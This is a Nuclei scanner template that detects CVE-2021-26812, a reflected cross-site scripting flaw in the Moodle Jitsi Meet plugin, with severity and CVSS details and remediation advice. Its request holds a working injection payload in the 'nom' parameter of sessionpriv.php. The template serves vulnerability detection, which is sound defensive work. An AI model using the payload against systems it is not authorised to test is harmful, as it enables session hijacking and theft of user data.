id: CVE-2021-26812

info:
  name: Moodle Jitsi Meet 2.7-2.8.3 - Cross-Site Scripting
  author: aceseven (digisec360)
  severity: medium
  description: Moodle Jitsi Meet 2.7 through 2.8.3 plugin contains a cross-site scripting vulnerability via the "sessionpriv.php" module. This allows attackers to craft a malicious URL, which when clicked on by users, can inject JavaScript code to be run by the application.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Update to the latest version of the Moodle Jitsi Meet plugin to mitigate the XSS vulnerability.
  reference:
    - https://github.com/udima-university/moodle-mod_jitsi/issues/67
    - https://nvd.nist.gov/vuln/detail/CVE-2021-26812
    - https://github.com/ARPSyndicate/kenzer-templates
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-26812
    cwe-id: CWE-79
    epss-score: 0.00464
    epss-percentile: 0.75413
    cpe: cpe:2.3:a:jitsi:meet:*:*:*:*:*:moodle:*:*
  metadata:
    max-request: 1
    vendor: jitsi
    product: meet
    framework: moodle
  tags: cve2021,cve,moodle,jitsi,xss,plugin

http:
  - method: GET
    path:
      - "{{BaseURL}}/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2F{{Hostname}}%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "alert(document.domain);"

      - type: word
        part: header
        words:
          - "MoodleSession"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502204fa9aa4db39e0b42abf9a24f5154f235a2eb0e3fee9a5f2197923311ee5d3698022100cebb7239dd398f17a96f61d4be6833b7fa967326d198a444b119c994a0871845:922c64590222798bb761d5b6d8e72950